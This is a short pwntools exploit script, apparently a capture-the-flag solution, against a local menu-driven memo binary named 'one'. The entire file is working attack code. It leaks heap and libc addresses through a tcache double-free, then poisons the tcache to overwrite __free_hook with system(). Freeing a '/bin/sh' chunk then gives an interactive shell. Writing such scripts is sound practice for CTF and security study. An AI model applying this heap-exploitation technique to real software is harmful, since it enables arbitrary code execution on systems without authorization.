from pwn import *
from sys import argv
from time import sleep

context.log_level = "debug"

binfile = "./one"

elf = ELF(binfile)

if len(argv) >= 2 and argv[1] == "d":
    p = gdb.debug(binfile, '''
        break *show+40
        continue
    ''')
else:
    p = process(binfile)

def add(data):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("Input memo > ")
    p.sendline(data)

def show():
    p.recvuntil("> ")
    p.sendline("2")
    
def delete():
    p.recvuntil("> ")
    p.sendline("3")

def ext():
    p.recvuntil("> ")
    p.sendline("0")

# leak heap addr    
add(b"AAAAAAAA")
add(b"BBBBBBBB")
delete()
delete()
delete()
delete()
show()
heap_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x12c0
log.info("heap_base: 0x{:08x}".format(heap_base))

add(p64(heap_base+0x1260))
add(b"CCCCCCCC")
add(p64(0x0)+p64(0xa1)+p64(0x0))

add(b"DDDDDDDD")
delete()
delete()

add(p64(heap_base+0x1270))
add(b"EEEEEEEE")
add(b"FFFFFFFF")

delete()
delete()
delete()
delete()
delete()
delete()
delete()
delete()
show()

libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x60 -0x3ebc40
log.info("libc_base: 0x{:08x}".format(libc_base))

free_hook = libc_base + 0x3ed8e8
system_addr = libc_base + 0x4f440

add(b"GGGGGGGG")
delete()
delete()

add(p64(free_hook))
add(b"HHHHHHHH")
add(p64(system_addr))

add(b"/bin/sh")
delete()
p.interactive()
